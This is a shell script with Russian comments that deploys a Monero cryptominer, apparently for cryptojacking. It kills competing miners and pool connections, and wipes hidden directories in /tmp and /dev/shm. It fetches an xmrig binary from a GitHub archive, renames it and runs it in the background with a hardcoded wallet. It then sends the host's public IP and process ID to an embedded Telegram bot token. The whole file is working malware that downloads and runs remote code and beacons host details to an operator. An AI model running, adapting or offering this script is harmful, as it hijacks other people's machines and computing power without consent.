#!/bin/sh
# Универсальный скрипт для всех систем (даже без bash/wget)

# Функция для определения доступного загрузчика
get_downloader() {
    if command -v wget >/dev/null 2>&1; then
        echo "wget -qO-"
    elif command -v curl >/dev/null 2>&1; then
        echo "curl -s"
    else
        echo "Error: Neither wget nor curl is installed" >&2
        exit 1
    fi
}

# Функция для получения публичного IP-адреса
get_public_ip() {
    if command -v curl >/dev/null 2>&1; then
        curl -s https://api.ipify.org 2>/dev/null || curl -s https://ifconfig.me 2>/dev/null || echo "unknown_ip"
    elif command -v wget >/dev/null 2>&1; then
        wget -qO- https://api.ipify.org 2>/dev/null || wget -qO- https://ifconfig.me 2>/dev/null || echo "unknown_ip"
    else
        echo "unknown_ip"
    fi
}

# Функция для отправки сообщения в Telegram
send_telegram() {
    local message="$1"
    local bot_token="5165906652:AAG5lSl97Ol9EiP5AJQfGApNJz5E5gBRrdo"
    local chat_id="1136073640"
    
    if command -v curl >/dev/null 2>&1; then
        curl -s "https://api.telegram.org/bot$bot_token/sendMessage" \
            -d "chat_id=$chat_id" \
            -d "parse_mode=HTML" \
            -d "text=$message" >/dev/null 2>&1
    elif command -v wget >/dev/null 2>&1; then
        wget -qO- "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&parse_mode=HTML&text=$message" >/dev/null 2>&1
    fi
}

DOWNLOADER=$(get_downloader)

# Принудительное завершение процессов (работает без bash)
killall_processes() {
    for proc in nohup xmrig miner cpuminer xmr-stak systemd-service systemf monero; do
        pkill -9 -f "$proc" 2>/dev/null || killall -9 "$proc" 2>/dev/null || true
    done
    
    # Популярные пулы
    for pool in pool.hashvault.pro moneroocean.stream gulf.moneroocean.stream supportxmr.com nanopool.org minexmr.com xmrig.com xmrig.cc pool.minexmr.com xmrpool.eu moneropool.com pool.4i77.com pool.usxmrpool.com xmrpool.net fairhash.org monero.crypto-pool.fr sumominer.com monero.hashvault.pro backup-pool.com moriaxmr.com bohemianpool.com mine.xmrpool.net pool.xmr.pt; do
        pkill -9 -f "$pool" 2>/dev/null || true
    done
}

# Генерация случайного имени (работает без /dev/urandom)
generate_worker_name() {
    if [ -f /dev/urandom ]; then
        WORKER_NAME=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
    else
        WORKER_NAME=$(date +%s | sha256sum | base64 | head -c 8 2>/dev/null || echo "worker$(date +%s | cut -c9-12)")
    fi
    echo "$WORKER_NAME"
}

# Основная логика
killall_processes

# Чистка скрытых мест
for path in /tmp/.x /tmp/.x/m /dev/shm/.x /dev/shm/.x/m ./.cache hwloc-without-main main.zip; do
    rm -rf "$path" 2>/dev/null || true
done

# Поиск подозрительных файлов
for loc in /tmp /dev/shm; do
    find "$loc" -name '.X*' -type d -exec rm -rf {} \; 2>/dev/null || true
    find "$loc" -name '.cache' -type d -exec rm -rf {} \; 2>/dev/null || true
done

# Генерация имени воркера
WORKER_NAME=$(generate_worker_name)

# Скачивание и запуск
TMP_DIR=$(mktemp -d 2>/dev/null || mktemp -d -t 'mytmpdir' 2>/dev/null || echo "/tmp/miner_$(date +%s)")
mkdir -p "$TMP_DIR"
cd "$TMP_DIR" || exit 1

$DOWNLOADER https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip > main.zip
unzip -o main.zip >/dev/null 2>&1 || { echo "Unzip failed, trying with busybox unzip"; busybox unzip -o main.zip 2>/dev/null; }
cd hwloc-without-main || exit 1

chmod +x xmrig 2>/dev/null || true
mv xmrig m

./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
PID=$!

echo "[*] Miner started with worker name: $WORKER_NAME"
echo "[*] Process ID: $PID"
echo "[*] To stop the miner, run: kill $PID"

# Получаем IP и отправляем в Telegram
PUBLIC_IP=$(get_public_ip)
MESSAGE="<b>New Miner Deployment</b>%0A%0A<b>IP Address:</b> $PUBLIC_IP%0A<b>Worker Name:</b> $WORKER_NAME%0A<b>Process ID:</b> $PID%0A<b>Stop command:</b> kill $PID"
send_telegram "$MESSAGE"

echo "[*] Deployment notification sent to Telegram"
